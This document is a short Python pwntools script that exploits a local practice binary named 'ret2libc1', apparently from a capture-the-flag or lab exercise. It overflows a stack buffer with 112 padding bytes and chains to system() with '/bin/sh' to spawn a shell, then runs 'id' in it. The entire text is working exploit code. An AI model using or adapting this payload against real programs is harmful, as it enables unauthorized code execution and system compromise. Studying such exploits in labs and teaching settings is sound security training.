#!/usr/bin/env python3
from pwn import *
import time
context.log_level='error'
context.arch='i386'
BIN='../src/ret2libc1'
e=ELF(BIN)
system=e.plt['system']
binsh=next(e.search(b'/bin/sh'))
payload=b'A'*112+p32(system)+p32(0)+p32(binsh)
io=process(BIN)
io.sendline(payload)
time.sleep(0.4)
io.sendline(b'echo PWNED_LIBC1; id; exit')
print(io.recvall(timeout=5).decode('utf-8','replace'))